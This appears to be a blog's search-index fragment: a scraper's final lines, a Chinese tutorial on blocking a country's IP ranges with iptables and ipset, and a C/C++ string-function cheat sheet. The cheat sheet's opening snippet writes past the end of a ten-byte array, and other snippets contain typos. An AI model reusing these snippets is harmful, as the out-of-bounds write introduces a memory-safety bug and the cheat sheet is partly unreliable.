class="string">""</span></span><br><span class="line">        index = str(result[<span class="string">"NUM"</span>])  <span class="comment"># 序号 无用</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> index: index = <span class="string">"0"</span></span><br><span class="line">        <span class="comment"># 插</span></span><br><span class="line">        insertone(index, kch, kxh, kcm, xf, kclb, kclbmc, kkxsh, kkxsm, kkxsjc, jsh, ksm, sjdd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">173</span>):</span><br><span class="line">    godata(str(i))</span><br><span class="line">    print(<span class="string">"第"</span> + str(i) + <span class="string">"页完成"</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>屏蔽一个国家所有IP</title>
      <link href="/2018/block-all-IPs-in-a-country.html"/>
      <url>/2018/block-all-IPs-in-a-country.html</url>
      
        <content type="html"><![CDATA[<p>搭建了一个MTProxy，分享出去，最后发现网速跑满，连接ip数高达600多，并且还在不断增加。<br>查看ip来源后发现九成以上是伊朗人，后来知道原来tg在他们国家被封了，所以才导致如此。</p><p>所以想办法屏蔽这些ip，准确的说是一整个国家的ip,或者说是一堆ip</p><h2 id="使用iptables添加规则"><a href="#使用iptables添加规则" class="headerlink" title="使用iptables添加规则"></a>使用iptables添加规则</h2><p>方法如下：<br>1.下载一个国家的ip段，网址：<a href="http://www.ipdeny.com/ipblocks/" target="_blank" rel="noopener">http://www.ipdeny.com/ipblocks/</a></p><p><code>wget http://www.ipdeny.com/ipblocks/data/countries/ir.zone</code></p><p>2.使用脚本批量添加iptables规则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Block traffic from a specific country</span></span><br><span class="line"></span><br><span class="line">COUNTRY="ir"</span><br><span class="line">IPTABLES=/sbin/iptables</span><br><span class="line">EGREP=/bin/egrep</span><br><span class="line"></span><br><span class="line">if [ "$(id -u)" != "0" ]; then</span><br><span class="line">    echo "you must be root" 1&gt;&amp;2</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">resetrules() &#123;</span><br><span class="line"><span class="meta">$</span><span class="bash">IPTABLES -F</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IPTABLES -t nat -F</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IPTABLES -t mangle -F</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IPTABLES -X</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resetrules</span><br><span class="line"></span><br><span class="line">for c in $COUNTRY</span><br><span class="line">do</span><br><span class="line">        country_file=$c.zone</span><br><span class="line"></span><br><span class="line">        IPS=$($EGREP -v "^#|^$" $country_file)</span><br><span class="line">        for ip in $IPS</span><br><span class="line">        do</span><br><span class="line">            echo "blocking $ip"</span><br><span class="line">            $IPTABLES -A INPUT -s $ip -j DROP</span><br><span class="line">        done</span><br><span class="line">done</span><br><span class="line">iptables-save</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><h2 id="使用ipset添加ip集合"><a href="#使用ipset添加ip集合" class="headerlink" title="使用ipset添加ip集合"></a>使用ipset添加ip集合</h2><p>发现用iptables直接添加ip实在低效，可以用其扩展ipset直接添加一个集合。</p><p>什么是IP集?</p><p>这时候就是IP集登场了。IP集是一个内核特性，它允许多个（独立）IP地址、MAC地址或者甚至是端口号被编码和有效地存储在位图/哈希内核数据结构中。一旦IP集创建之后，你可以创建一条iptables规则来匹配这个集合。</p><p>你马上就会看见IP集合的好处了，它可以让你用一条iptable规则匹配多个ip地址！你可以用多个IP地址和端口号的方式来构造IP集，并且可以动态地更新规则而没有性能影响。<br>在Linux中安装IPset工具</p><p>为了创建和管理IP集，你需要使用称为ipset的用户空间工具。</p><p>要在Debian、Ubuntu或者Linux Mint上安装：</p><p><code>$ sudo apt-get install ipset</code></p><p>Fedora或者CentOS/RHEL 7上安装：</p><p><code>$ sudo yum install ipset</code></p><p>使用IPset命令禁止IP</p><p>让我通过简单的示例告诉你该如何使用ipset命令。</p><p>首先，让我们创建一条新的IP集，名为banthis（名字任意）：</p><p><code>$ sudo ipset create banthis hash:net</code></p><p>第二个参数(hash:net)是必须的，代表的是集合的类型。IP集有多个类型。hash:net类型的IP集使用哈希来存储多个CIDR块。如果你想要在一个集合中存储单独的IP地址，你可以使用hash:ip类型。</p><p>一旦创建了一个IP集之后，你可以用下面的命令来检查：</p><p><code>$ sudo ipset list</code></p><p>这显示了一个可用的IP集合列表，并有包含了集合成员的详细信息。默认上，每个IP集合可以包含65536个元素（这里是CIDR块）。你可以通过追加”maxelem N”选项来增加限制。</p><p><code>$ sudo ipset create banthis hash:net maxelem 1000000</code></p><p>现在让我们来增加IP块到这个集合中：</p><p><code>$ sudo ipset add banthis 1.1.1.1/32</code><br><code>$ sudo ipset add banthis 1.1.2.0/24</code><br><code>$ sudo ipset add banthis 1.1.3.0/24</code><br><code>$ sudo ipset add banthis 1.1.4.10/24</code></p><p>这一步可以使用shell脚本自动添加</p><p>你会看到集合成员已经改变了。</p><p><code>$ sudo ipset list</code></p><p>现在是时候去创建一个使用IP集的iptables规则了。这里的关键是使用”-m set –match-set “选项。</p><p>现在是时候去创建一个使用IP集的iptables规则了。这里的关键是使用”-m set –match-set “选项。</p><p>现在让我们创建一条让之前那些IP块不能通过80端口访问web服务的iptable规则。可以通过下面的命令：</p><p><code>$ sudo iptables -I INPUT -m set --match-set banthis src -p tcp --destination-port 80 -j DROP</code></p><p>如果你愿意，你可以保存特定的IP集到一个文件中，以后可以从文件中还原：</p><p><code>$ sudo ipset save banthis -f banthis.txt</code><br><code>$ sudo ipset destroy banthis</code><br><code>$ sudo ipset restore -f banthis.txt</code></p><h2 id="自用脚本"><a href="#自用脚本" class="headerlink" title="自用脚本"></a>自用脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">EGREP=/bin/egrep</span><br><span class="line"></span><br><span class="line">con_file=$1.zone</span><br><span class="line">ipset=$1ip</span><br><span class="line">wget http://www.ipdeny.com/ipblocks/data/countries/$con_file</span><br><span class="line">ipset creat $ipset hash:net    </span><br><span class="line">IPS=$($EGREP -v "^#|^$" $con_file)</span><br><span class="line">for ip in $IPS</span><br><span class="line">do</span><br><span class="line">    ipset add $ipset $ip</span><br><span class="line">done</span><br><span class="line">rm $con_file</span><br><span class="line">iptables -I INPUT -m set --match-set $ipset src -p tcp --destination-port 6666 -j DROP</span><br><span class="line">iptables-save</span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.jb51.net/LINUXjishu/339309.html" target="_blank" rel="noopener">在Linux下实现批量屏蔽IP地址的方法</a></p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ipset </tag>
            
            <tag> iptables </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c/c++字符串处理大集合</title>
      <link href="/2018/c-cpp-string-op.html"/>
      <url>/2018/c-cpp-string-op.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rember <span class="keyword">this</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>(a,b,<span class="number">5</span>);</span><br><span class="line">a[<span class="number">5</span>]=<span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="string">'#'</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">a[<span class="number">10</span>]=<span class="string">'\0'</span>;</span><br></pre></td></tr></table></figure><p>刚开始学C/C++时，一直对字符串处理函数一知半解，这里列举C/C++字符串处理函数，希望对初学者有一定的帮助。</p><h1 id="C："><a href="#C：" class="headerlink" title="C："></a>C：</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> st[<span class="number">100</span>];</span><br></pre></td></tr></table></figure><ol><li><p>字符串长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strlen</span>(st);</span><br></pre></td></tr></table></figure></li><li><p>字符串比较</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcmp</span>(st1,st2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//把st1,st2的前n个进行比较。</span></span><br><span class="line"><span class="built_in">strncmp</span>(st1,st2,n);</span><br></pre></td></tr></table></figure></li><li><p>附加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcat</span>(st1,st2);</span><br><span class="line"><span class="built_in">strncat</span>(st1,st2,n); <span class="comment">//n表示连接上st2的前n个给st1，在最后不要加'\0'。</span></span><br></pre></td></tr></table></figure></li><li><p>替换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(st1,st2);</span><br><span class="line"><span class="built_in">strncpy</span>(st1,st2,n); <span class="comment">//n表示复制st2的前n个给st1，在最后要加'\0'。</span></span><br></pre></td></tr></table></figure></li><li><p>查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">where = <span class="built_in">strchr</span>(st,ch) <span class="comment">//ch为要找的字符。</span></span><br><span class="line">where = <span class="built_in">strspn</span>(st1,st2); <span class="comment">//查找字符串。</span></span><br><span class="line">where = <span class="built_in">strstr</span>(st1,st2);</span><br></pre></td></tr></table></figure></li></ol><h1 id="C-："><a href="#C-：" class="headerlink" title="C++："></a>C++：</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">string</span>&gt;</span><br><span class="line"><span class="built_in">string</span> str;</span><br></pre></td></tr></table></figure><ol><li><p>字符串长度</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">len = str.length();</span><br><span class="line">len = str.size();</span><br></pre></td></tr></table></figure></li><li><p>字符串比较<br>可以直接比较<br>也可以:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str1.compare(str2);</span><br><span class="line">str1.compare(pos1,len1,str2,pos2,len2); <span class="comment">//值为负，0 ，正。</span></span><br><span class="line"><span class="comment">//nops 长度到完。</span></span><br></pre></td></tr></table></figure></li><li><p>附加<br><code>str1 += str2;</code><br>或</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str1.append(str2);</span><br><span class="line">str1.append(str2.pos2,len2);</span><br></pre></td></tr></table></figure></li><li><p>字符串提取</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str2 = str1.substr();</span><br><span class="line">str2 = str1.substr(pos1);</span><br><span class="line">str2 = str1.substr(pos1,len1);</span><br><span class="line"><span class="built_in">string</span> a=s.substr(<span class="number">0</span>,<span class="number">4</span>); <span class="comment">//获得字符串s中 从第0位开始的长度为4的字符串</span></span><br></pre></td></tr></table></figure></li><li><p>字符串搜索</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">where = str1.find(str2);</span><br><span class="line">where = str1.find(str2,pos1);  <span class="comment">//pos1是从str1的第几位开始。</span></span><br><span class="line">where = str1.rfind(str2); <span class="comment">//从后往前搜。</span></span><br></pre></td></tr></table></figure></li><li><p>插入字符串<br>不是赋值语句。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str1.insert(pos1,str2);</span><br><span class="line">str1.insert(pos1,str2,pos2,len2);</span><br><span class="line">str1.insert(pos1,numchar,<span class="keyword">char</span>); <span class="comment">//numchar是插入次数，char是要插入的字符。</span></span><br></pre></td></tr></table></figure></li><li><p>替换字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str1.replace(pos1,str2);</span><br><span class="line">str1.replace(pos1,str2,pos2,len2);</span><br></pre></td></tr></table></figure></li><li><p>删除字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str.erase(pos,len)</span><br><span class="line">str.clear();</span><br></pre></td></tr></table></figure></li><li><p>交换字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swap(str1,str2);</span><br></pre></td></tr></table></figure></li><li><p>C –&gt; C++</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *cstr = <span class="string">"Hello"</span>;</span><br><span class="line"><span class="built_in">string</span> str1;</span><br><span class="line">cstr = cstr;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">str2</span><span class="params">(cstr)</span></span>;</span><br></pre></td></tr></table></figure></li></ol><p>对于ACMer来说，C的字符串处理要比C++的方便、简单，尽量用C的字符串处理函数。</p><h1 id="C-中string类常用算法"><a href="#C-中string类常用算法" class="headerlink" title="C++中string类常用算法"></a>C++中string类常用算法</h1><h2 id="string类的构造函数："><a href="#string类的构造函数：" class="headerlink" title="string类的构造函数："></a>string类的构造函数：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span>(<span class="keyword">const</span> <span class="keyword">char</span> *s); <span class="comment">//用c字符串s初始化</span></span><br><span class="line"><span class="built_in">string</span>(<span class="keyword">int</span> n,<span class="keyword">char</span> c); <span class="comment">//用n个字符c初始化</span></span><br></pre></td></tr></table></figure><p>此外，string类还支持默认构造函数和复制构造函数，如:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> s1；<span class="built_in">string</span></span><br><span class="line">s2=<span class="string">"hello"</span>；</span><br></pre></td></tr></table></figure><p>都是正确的写法。</p><p>当构造的string太长而无法表达时会抛出<code>length_error</code>异常</p><h2 id="string类的字符操作："><a href="#string类的字符操作：" class="headerlink" title="string类的字符操作："></a>string类的字符操作：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> &amp;<span class="keyword">operator</span>[](<span class="keyword">int</span> n)<span class="keyword">const</span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> &amp;<span class="title">at</span><span class="params">(<span class="keyword">int</span> n)</span><span class="keyword">const</span></span>;</span><br><span class="line"><span class="keyword">char</span> &amp;<span class="keyword">operator</span>[](<span class="keyword">int</span> n);</span><br><span class="line"><span class="function"><span class="keyword">char</span> &amp;<span class="title">at</span><span class="params">(<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="comment">//operator[]和at()均返回当前字符串中第n个字符的位置，但at函数提供范围检查，当越界时会抛出out_of_range异常，下标运算符[]不提供检查访问。</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">data</span><span class="params">()</span><span class="keyword">const</span></span>;<span class="comment">//返回一个非null终止的c字符数组</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">c_str</span><span class="params">()</span><span class="keyword">const</span></span>;<span class="comment">//返回一个以null终止的c字符串</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n, <span class="keyword">int</span> pos = <span class="number">0</span>)</span> <span class="keyword">const</span></span>;<span class="comment">//把当前串中以pos开始的n个字符拷贝到以s为起始位置的字符数组中，返回实际拷贝的数目</span></span><br></pre></td></tr></table></figure><h2 id="string的特性描述"><a href="#string的特性描述" class="headerlink" title="string的特性描述:"></a>string的特性描述:</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">capacity</span><span class="params">()</span><span class="keyword">const</span></span>; <span class="comment">//返回当前容量（即string中不必增加内存即可存放的元素个数）</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_size</span><span class="params">()</span><span class="keyword">const</span></span>; <span class="comment">//返回string对象中可存放的最大字符串的长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span><span class="keyword">const</span></span>;<span class="comment">//返回当前字符串的大小</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">length</span><span class="params">()</span><span class="keyword">const</span></span>; <span class="comment">//返回当前字符串的长度</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span><span class="keyword">const</span></span>;<span class="comment">//当前字符串是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> len,<span class="keyword">char</span> c)</span></span>;<span class="comment">//把字符串当前大小置为len，并用字符c填充不足的</span></span><br></pre></td></tr></table></figure><h2 id="部分string类的输入输出操作"><a href="#部分string类的输入输出操作" class="headerlink" title="部分string类的输入输出操作:"></a>部分string类的输入输出操作:</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span>类重载运算符<span class="keyword">operator</span>&gt;&gt;<span class="comment">//用于输入，同样重载运算符operator&lt;&lt;用于输出操作。函数getline(istream &amp;in,string &amp;s);//用于从输入流in中读取字符串到s中，以换行符'\n'分开。</span></span><br></pre></td></tr></table></figure><h2 id="string的赋值："><a href="#string的赋值：" class="headerlink" title="string的赋值："></a>string的赋值：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> &amp;<span class="keyword">operator</span>=(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s);<span class="comment">//把字符串s赋给当前字符串</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">assign</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>;<span class="comment">//用c类型字符串s赋值</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">assign</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s,<span class="keyword">int</span> n)</span></span>;<span class="comment">//用c字符串s开始的n个字符赋值</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">assign</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s)</span></span>;<span class="comment">//把字符串s赋给当前字符串</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">assign</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> c)</span></span>;<span class="comment">//用n个字符c赋值给当前字符串</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">assign</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s,<span class="keyword">int</span> start,<span class="keyword">int</span> n)</span></span>;<span class="comment">//把字符串s中从start开始的n个字符赋给当前字符串</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">assign</span><span class="params">(const_iterator first,const_itertor last)</span></span>;<span class="comment">//把first和last迭代器之间的部分赋给字符串</span></span><br></pre></td></tr></table></figure><h2 id="string的连接："><a href="#string的连接：" class="headerlink" title="string的连接："></a>string的连接：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//把字符串s连接到当前字符串的结尾</span></span><br><span class="line"><span class="built_in">string</span> &amp;<span class="keyword">operator</span>+=(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s);</span><br><span class="line"></span><br><span class="line"><span class="comment">//把c类型字符串s连接到当前字符串结尾</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">append</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把c类型字符串s的前n个字符连接到当前字符串结尾</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">append</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s,<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同operator+=()</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">append</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把字符串s中从pos开始的n个字符连接到当前字符串的结尾</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">append</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s,<span class="keyword">int</span> pos,<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在当前字符串结尾添加n个字符c</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">append</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> c)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把迭代器first和last之间的部分连接到当前字符串的结尾</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> &amp;<span class="title">append</span><span class="params">(const_iterator first,const_iterator last)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="string的比较："><a href="#string的比较：" class="headerlink" title="string的比较："></a>string的比较：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//比较两个字符串是否相等运算符"&gt;","&lt;","&gt;=","&lt;=","!="均被重载用于字符串的比较；</span></span><br><span class="line"><span class="keyword">bool</span> perator==(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s1,<span class="keyword">const</span> <span class="built_in">string</span> &amp;s2)<span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//比较当前字符串和s的大小</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//比较当前字符串从pos开始的n个字符组成的字符串与s的大小</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> n,<span class="keyword">const</span> <span class="built_in">string</span> &amp;s)</span><span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//比较当前字符串从pos开始的n个字符组成的字符串与s中pos2开始的n2个字符组成的字符串的大小</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> n,<span class="keyword">const</span> <span class="built_in">string</span> &amp;s,<span class="keyword">int</span> pos2,<span class="keyword">int</span> n2)</span><span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> n,<span class="keyword">const</span> <span class="keyword">char</span> *s)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> n,<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> pos2)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//compare函数在&gt;时返回1，&lt;时返回-1，==时返回0</span></span><br></pre></td></tr></table></figure><h2 id="string的子串："><a href="#string的子串：" class="headerlink" title="string的子串："></a>string的子串：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回pos开始的n个字符组成的字符串string的交换：</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">substr</span><span class="params">(<span class="keyword">int</span> pos = <span class="number">0</span>,<span class="keyword">int</span> n = npos)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//交换当前字符串与s2的值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="built_in">string</span> &amp;s2)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="string类的查找函数："><a href="#string类的查找函数：" class="headerlink" title="string类的查找函数："></a>string类的查找函数：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 